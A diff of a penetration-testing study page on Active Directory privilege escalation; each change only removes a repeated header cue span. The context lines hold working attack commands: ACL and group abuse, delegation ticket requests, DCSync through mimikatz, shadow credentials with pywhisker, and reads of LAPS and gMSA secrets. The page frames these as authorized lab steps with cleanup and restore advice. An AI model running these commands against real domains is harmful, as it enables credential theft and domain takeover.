@@ -93,7 +93,7 @@ Add-DomainObjectAcl -TargetIdentity TARGET_GROUP -PrincipalIdentity CONTROLLED_U
 <h4 id="variant-9-6-4-1-4-3">9.6.4.1.4.3 Remove the ACE after the authorized objective</h4><pre><code class="language-powershell"># Remove the ACE after the authorized objective
 Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose
 </code></pre>
-<p>Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge.</p><details data-method-fold><summary><h2 id="conditional-gpo-control">9.6.4.2 Trace writable policy to a privileged consumer and trigger <span class="method-label">Conditional: GPO control</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Export the original owner/security descriptor before changing it and restore exactly that state. Password resets, membership changes, SPN writes, ownership changes and ACE grants are state changes; do not execute merely because a graph shows an edge.</p><details data-method-fold><summary><h2 id="conditional-gpo-control">9.6.4.2 Trace writable policy to a privileged consumer and trigger <span class="method-label">Conditional: GPO control</span></h2></summary>
 <a id="s-9-6-4-2"></a>
 <p>Identify GPOs and links:</p>
 <pre><code class="language-powershell">Get-DomainGPO
@@ -114,7 +114,7 @@ Get-DomainObjectAcl -SearchBase 'CN=Policies,CN=System,DC=DOMAIN,DC=TLD' -Resolv
 gpresult /r
 gpupdate /force
 </code></pre>
-<p>Back up the GPO, restrict the target/scope, document the exact change and restore it after validation.</p></details><details data-method-fold><summary><h2 id="conditional-delegation-paths">9.6.4.3 Check whether delegation rights enable access as another identity <span class="method-label">Conditional: delegation paths</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Back up the GPO, restrict the target/scope, document the exact change and restore it after validation.</p></details><details data-method-fold><summary><h2 id="conditional-delegation-paths">9.6.4.3 Check whether delegation rights enable access as another identity <span class="method-label">Conditional: delegation paths</span></h2></summary>
 <a id="s-9-6-4-3"></a>
 <p>Enumerate before attempting any ticket operation:</p>
 <pre><code class="language-powershell">Get-DomainComputer -Unconstrained | Select-Object dnshostname
@@ -149,7 +149,7 @@ impacket-getST -spn cifs/TARGET_HOST -impersonate AUTHORIZED_TEST_USER \
 impacket-addcomputer 'DOMAIN/USER:PASSWORD' -computer-name 'LABCOMPUTER$' \
   -delete -dc-ip DC_IP
 </code></pre>
-<p>Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites.</p></details><details data-method-fold><summary><h2 id="conditional-ad-cs-enumeration">9.6.4.4 Check whether certificate enrollment can enable another identity <span class="method-label">Conditional: AD CS enumeration</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Machine-account quota, computer-object rights, DNS/SPN naming and target service authorization are separate prerequisites.</p></details><details data-method-fold><summary><h2 id="conditional-ad-cs-enumeration">9.6.4.4 Check whether certificate enrollment can enable another identity <span class="method-label">Conditional: AD CS enumeration</span></h2></summary>
 <a id="s-9-6-4-4"></a>
 <blockquote>
 <p><strong><span class="reference-cue cue-condition">Prerequisite:</span></strong> reachable CA/DC and a valid domain identity. <strong><span class="reference-cue cue-evidence">Decisive output:</span></strong> a CA/template whose enabled state, enrollment rights and configuration satisfy a specific ESC path.</p>
@@ -212,7 +212,7 @@ Remove-DomainObjectAcl -TargetIdentity 'DC=DOMAIN,DC=TLD' -PrincipalIdentity CON
 <div class="command-pair"><div class="command-action"><pre><code class="language-text">lsadump::dcsync /domain:DOMAIN /user:TARGET_USER
 </code></pre></div><div class="command-reading"><blockquote>
 <p><strong><span class="reference-cue cue-evidence">Decisive output:</span></strong> selected directory secret material returned through replication. Treat it as domain compromise evidence. Stop, protect evidence, document the delegated right and move to remediation reasoning rather than broad collection.</p>
-</blockquote></div></div><details data-method-fold><summary><h2 id="conditional-high-impact-ticket-forging-concepts">9.6.4.8 Understand the access enabled by compromised domain ticket keys <span class="method-label">Conditional: high-impact ticket-forging concepts</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+</blockquote></div></div><details data-method-fold><summary><h2 id="conditional-high-impact-ticket-forging-concepts">9.6.4.8 Understand the access enabled by compromised domain ticket keys <span class="method-label">Conditional: high-impact ticket-forging concepts</span></h2></summary>
 <a id="s-9-6-4-8"></a>
 <p>Golden tickets require the domain SID and KRBTGT key. They are persistence/impact concepts, not a default Block 11 action. A forged ticket still depends on correct cryptographic material, realm, time and authorization. For the active service-scoped case, use <a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/#8-silver-tickets-forge-one-service-ticket">Silver tickets</a>.</p>
 <p>Authorized isolated-lab examples:</p>
@@ -237,7 +237,7 @@ bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
   add groupMember TARGET_GROUP USER
 </code></pre>
 <p>Read: verify the actual attribute change and test the resulting identity/capability through a compatible service. Group changes do not automatically refresh an existing process token/ticket. Access denied → inspect the object DACL and protected-account context; authentication alone is insufficient. Account Operators membership does not imply control over protected administrator accounts/groups.</p>
-<p>Sources: <a href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="delegated-reads--laps-and-gmsa-material">9.6.4.10 Read managed credentials only where your identity has delegated access <span class="method-label">Delegated reads — LAPS and gMSA material</span></h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">upstream 1</a>.</p></details><details data-method-fold><summary><h2 id="delegated-reads--laps-and-gmsa-material">9.6.4.10 Read managed credentials only where your identity has delegated access <span class="method-label">Delegated reads — LAPS and gMSA material</span></h2></summary>
 <a id="s-9-6-4-10"></a>
 <p>Use when directory permissions grant access to the secret-bearing attribute. Being able to enumerate the computer or service account does not grant that read.</p>
 <h3 id="variant-9-6-4-10-1">9.6.4.10.1 Classic LAPS: password for the relevant computer's local administrator</h3><pre><code class="language-bash"># Classic LAPS: password for the relevant computer's local administrator
@@ -251,7 +251,7 @@ bloodyAD --host DC_HOST -d DOMAIN -u USER -p 'PASSWORD' \
   get object 'GMSA$' --attr msDS-ManagedPassword
 </code></pre>
 <p>Read: a LAPS value is scoped to the named host's local account. An encrypted Windows-LAPS value still needs the permitted decryption context. A gMSA blob/base64 string is not automatically a directly reusable NT hash: parse/decode it with a compatible gMSA tool before choosing authentication. Missing/denied attributes → distinguish schema, permissions and an empty value.</p>
-<p>Sources: <a href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">upstream 1</a> · <a href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview">upstream 2</a>.</p></details><details data-method-fold><summary><h2 id="shadow-credentials--object-key-write-pkinit-then-cleanup">9.6.4.11 Shadow credentials — object-key write, PKINIT, then cleanup</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://github.com/CravateRouge/bloodyAD/wiki/User-Guide">upstream 1</a> · <a href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview">upstream 2</a>.</p></details><details data-method-fold><summary><h2 id="shadow-credentials--object-key-write-pkinit-then-cleanup">9.6.4.11 Shadow credentials — object-key write, PKINIT, then cleanup</h2></summary>
 <a id="s-9-6-4-11"></a>
 <p>Use only with effective write access to the target's <code>msDS-KeyCredentialLink</code>, a DC supporting the required key-trust/PKINIT behavior, correct time/DNS and compatible certificates. Inspect existing values first.</p>
 <h3 id="variant-9-6-4-11-1">9.6.4.11.1 python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \</h3><pre><code class="language-bash">python3 pywhisker.py -d DOMAIN -u USER -p 'PASSWORD' --dc-ip DC_IP \
@@ -294,7 +294,7 @@ New-MachineAccount -MachineAccount NEWPC -Password $machinePassword `
   -Domain DOMAIN -DomainController DC_HOST
 </code></pre>
 <p>Read: verify the created account, its SPNs and the chosen target-object permission separately. Quota, OU ACLs and existing names can stop the operation. Standard create rights do not necessarily permit deleting the created account later; establish the cleanup route and avoid repeated throwaway account creation.</p>
-<p>Sources: <a href="https://github.com/Kevin-Robertson/Powermad">upstream 1</a>.</p><details data-method-fold><summary><h2 id="gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights">9.6.4.14 gMSA — obtain a decoded hash only with managed-password read rights</h2><span class="method-choice-cue">Check this approach’s stated access/configuration prerequisites and decisive verification before choosing it.</span></summary>
+<p>Sources: <a href="https://github.com/Kevin-Robertson/Powermad">upstream 1</a>.</p><details data-method-fold><summary><h2 id="gmsa--obtain-a-decoded-hash-only-with-managed-password-read-rights">9.6.4.14 gMSA — obtain a decoded hash only with managed-password read rights</h2></summary>
 <a id="s-9-6-4-14"></a>
 <p>Use when the accepted directory identity has the managed-password read permission for the gMSA. NetExec selects LDAPS for this operation, so the DC's LDAP TLS path must work.</p>
 <h3 id="variant-9-6-4-14-1">9.6.4.14.1 nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa</h3><pre><code class="language-bash">nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa</code></pre>
